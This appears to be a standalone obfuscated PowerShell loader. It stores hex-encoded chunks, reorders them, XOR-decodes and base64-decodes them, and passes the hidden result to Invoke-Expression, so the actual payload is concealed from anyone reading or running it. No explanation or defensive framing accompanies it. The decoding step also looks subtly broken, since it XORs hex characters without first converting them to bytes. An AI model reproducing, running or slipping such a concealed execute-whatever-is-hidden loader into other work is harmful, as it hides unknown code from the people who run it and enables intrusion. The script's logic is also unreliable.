$k=166;
$d=@('96caf6ee95eef6d6c9caeedcd1c392d0d3e2f3f0c1f0f0e9f5ff8d90d5c3e4cecfeccde8cdf794e1d6928dd5f797c1eef3f6cdfec8ebf0e794c9', 'e49ff2d4e1eadcf393e2f1d5c789de9fdef0ff9397f4eef0ffcec5fc97c493cbf097cbc9f7f2c8c7ded0d796e1f290c1dccaecd2d7e2ec9eefcb', 'd1c1d1dce1d7c2cbd6e5e4899ee4fccde1f1ebf6c9f3c7d4dccf95dce7ced4c3c1e2fceaead5c98dd5de9690ccc0cbef94c8c0939f92ced4e38d', 'c2c9e0e7939096edd490d0edffc9dffffe8dfec492c8cdd7c2fecdd3c796ca9ecc95cdd39fdee2fee1cac99fcf8dd3eff3e2f396d390ffc497c2', '94c1fc89d1ebeb8989d3f1f394ff94edc2ed92d0d794e1e4e89389cb90d79e93d0d3c2d49391eef6cdc3c4fefeeb95ce9393c7e8edc4d1f3ff97', '9392e9f3e1cdec8de395fecad2e49ff2c789ffe1f2de90ffd2d0f489dedcd1908d89c8fec7c3c8d19b9b', 'c2c089cf9f93c3eaefd19190d393d5f1cee896f3c9f3ebc9eaf0d3c0f692e7e5d4c2e8cf94c5dff3c4cbcacccedfe5d7d1cdfc9593dee4f6e8fc', '9eedf3e0cbc5dfd2c5ef96c4f2eff7c5f7c9eadce58dc1d697f3e3dcebdf90f7e89fe0f3dfd7c9d7d6f3dfcaf7d3dffcf0f695c9fcc58d92e3f4', 'c7ecedefd4dff5d1d49294d7c3e2d3f591cbefc8e5d48dd1c4ff97c5c390e3eef6c895eb95eec7e5c1e2d2e5ebcf9ec3f3c895cfead5c2dce2f2', 'caecf0c2d4d5f2dce790caeef6d6dfc1ceccc8dccedfedc9e0c5f5fcceccc5f7ecd09f89f697e2cc96c0d0dfe99593cdf7c7c3f6ffd1e0cdcbea', 'd0d7fcd3d0cfdfd4c3edd6ffc9c7d5cbc5c1c1f6ef9edcc2e892c9cb91efc5ffcc8dc79ec7f5f4ead5c1e9d4ebc794eed5efdcc1d792d2d0c1ee', 'e9d5fcd5ccdcde90f3eed794dfd2dcc29f8d94c7d3c496d7d6efcfdfe2ec97f2cc92d2d4f5eac8f3edcce3cecbdee097eec4d491ecd7959190ff', 'f0d597f689d3d3f1c2cbf692c9eaedc4dfffdcc393ebfc8d91c5e9c0c0c5eb95c390eae3f093fce090fceac4e8cb97d2e394f2e896f3fcf4d39f', 'e493eddecf89ed9f9497e0f4c7edffe59389e1ebf1e994c7fec791f1c3ecf197e7e9d0c7f4e289e394e7d1f1f2fed197fcc9d3c1ebcec295ce89', '97fec8e7f6eb9fc0e5f2e093eac1d3c795dfd3cf91c5cd9593cf94cfc8dcd1e8f1edfcc4f6e2e0f1f4c2c29ff0d5e1c4c8d6ffecc4e7eadfe0eb', '93c094c1d2f5e7c0d0c796f1c8c3f5f1dce893dfc5f4f7ca97d2ee93c4edffc3f1ccdefefec2d4d4dcfccae0c089f690d2eec589ccd3ed91efd5', 'e9cdc7edf3ccc0f6dce3d3dcfff2c4de91d6c1cbde93d3d197d4ffc1f7dcc8e28dd4ecf3fce09ee993efcc9fdc9feff4fedcdf93cde5c8cbef93', '8dc1cfd3dfe5d3c4fc9edff09793e2e99e8dfccaf5ecdfc8c3c4d6dff5cdfcc29ed6c3f3d6e9d69fe5e8ca90ccfcc8d7c1e7cdc7d6d3cfd6cef4', 'defff2949edec0d3d492f091d595dff493c0d5fed5ecfeccd0eff7f7e4d5ff95cef2e29495dfebe9e29ee3d2c29efce1d19f9fe78de4fc92ec92', 'c3ecdce0f0ca97f6e396e3f3d0f789dc97e289c1cd91e0e5e396d6cff692eff5d5f4e1f7f0cdf7f2ceffc7e5f6cfcfec91c4ed9697c4c7ea95f7');
$o=@(14, 3, 17, 8, 10, 13, 15, 7, 5, 11, 18, 0, 2, 9, 6, 1, 12, 4, 16, 19);
$r=@();
foreach($x in $o){$r+=$d[$x]};
$s=[string]::Join('',$r);
$b=@();
foreach($c in $s.ToCharArray()){$b+=[char]([int]$c -bxor $k)};
$t=[string]::Join('',$b);
$dec=[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($t));
$ms=New-Object IO.MemoryStream;
$w=New-Object IO.StreamWriter($ms);
$w.Write($dec);
$w.Flush();
$ms.Position=0;
$sr=New-Object IO.StreamReader($ms);
$src=$sr.ReadToEnd();
Invoke-Expression $src
